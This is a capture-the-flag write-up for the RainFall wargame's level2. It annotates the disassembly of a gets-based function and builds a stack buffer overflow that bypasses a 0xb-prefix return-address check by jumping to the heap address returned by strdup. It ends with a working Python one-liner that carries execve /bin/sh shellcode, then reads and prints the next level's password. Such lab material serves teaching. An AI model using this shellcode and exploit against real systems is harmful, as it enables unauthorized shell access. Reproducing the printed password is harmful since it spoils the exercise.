 080484d4 <p>:
 80484d4:       55                      push   ebp
 80484d5:       89 e5                   mov    ebp,esp
 80484d7:       83 ec 68                sub    esp,0x68                 ; stack = 104bytes
 80484da:       a1 60 98 04 08          mov    eax,ds:0x8049860         ; stdout file stream to eax
 80484df:       89 04 24                mov    DWORD PTR [esp],eax      ; eax as first argument to function
 80484e2:       e8 c9 fe ff ff          call   80483b0 <fflush@plt>     ; fflush(stdout)
 80484e7:       8d 45 b4                lea    eax,[ebp-0x4c]           ; load to eax the stack - 76 bytes address
 80484ea:       89 04 24                mov    DWORD PTR [esp],eax      ; eax as argument to funciton
 80484ed:       e8 ce fe ff ff          call   80483c0 <gets@plt>       ; gets to this buffer
 80484f2:       8b 45 04                mov    eax,DWORD PTR [ebp+0x4]  ; load value in stack + 4 to eax 
 80484f5:       89 45 f4                mov    DWORD PTR [ebp-0xc],eax  ; put eax into stack - 16 
 80484f8:       8b 45 f4                mov    eax,DWORD PTR [ebp-0xc]  ; put stack - 16 into eax (repeating?)
 80484fb:       25 00 00 00 b0          and    eax,0xb0000000           ; put to 0 all except first 2 bits
 8048500:       3d 00 00 00 b0          cmp    eax,0xb0000000           ; compare eax with 0xb0000000
 8048505:       75 20                   jne    8048527 <p+0x53>         ; jump if not equal
 8048507:       b8 20 86 04 08          mov    eax,0x8048620            ; load the string "(%p)\n" into ax
 804850c:       8b 55 f4                mov    edx,DWORD PTR [ebp-0xc]  ; load stack - 16 into edx
 804850f:       89 54 24 04             mov    DWORD PTR [esp+0x4],edx  ; load edx as second argument
 8048513:       89 04 24                mov    DWORD PTR [esp],eax      ; load eax as first argument
 8048516:       e8 85 fe ff ff          call   80483a0 <printf@plt>     ; call printf
 804851b:       c7 04 24 01 00 00 00    mov    DWORD PTR [esp],0x1      ; 1 as exit value;
 8048522:       e8 a9 fe ff ff          call   80483d0 <_exit@plt>      ; _exit(1);
 8048527:       8d 45 b4                lea    eax,[ebp-0x4c]           ; stack - 76 (buf);
 804852a:       89 04 24                mov    DWORD PTR [esp],eax      ; buf as first argument
 804852d:       e8 be fe ff ff          call   80483f0 <puts@plt>       ; puts(buf)
 8048532:       8d 45 b4                lea    eax,[ebp-0x4c]           ; stack - 76 (buf);
 8048535:       89 04 24                mov    DWORD PTR [esp],eax      ; buf as argument
 8048538:       e8 a3 fe ff ff          call   80483e0 <strdup@plt>     ; strdup(buf);
 804853d:       c9                      leave  
 804853e:       c3                      ret

We run level2 with gdb.
disas main - calls p function
disas p
-> use the gets function, we can therefore use a buffer overflow.
However, there is no syscall to /bin/sh to allow us to access a shell.
-> use a shellcode
We segfault at 80 we will therefore have something like:
 print 'A' * x + 'shellcode' + address
 The shellcode we found has a length of 45, we will therefore print 35 A (80 - 45).

For the address, we cannot use an address located on the stack, because of this check:
   0x080484fb <+39>:	and    $0xb0000000,%eax
   0x08048500 <+44>:	cmp    $0xb0000000,%eax
   0x08048505 <+49>:	jne    0x8048527 <p+83>

If the address starts with 0xb, it  will exit the program.

level2@RainFall:~$ ltrace ./level2 
__libc_start_main(0x804853f, 1, 0xbffff7f4, 0x8048550, 0x80485c0 <unfinished ...>
fflush(0xb7fd1a20)                                                  = 0
gets(0xbffff6fc, 0, 0, 0xb7e5ec73, 0x80482b5hello
)                       = 0xbffff6fc
puts("hello"hello
)                                                       = 6
strdup("hello")                                                     = 0x0804a008
+++ exited (status 8) +++

-> We will use the return address of strdup, which is located on the heap.

Shellcode from: https://beta.hackndo.com/buffer-overflow/

--> level2@RainFall:~$ (python -c "print 'A' * 35 + '\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh' + '\x08\xa0\x04\x08'" ; cat) | ./level2
cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
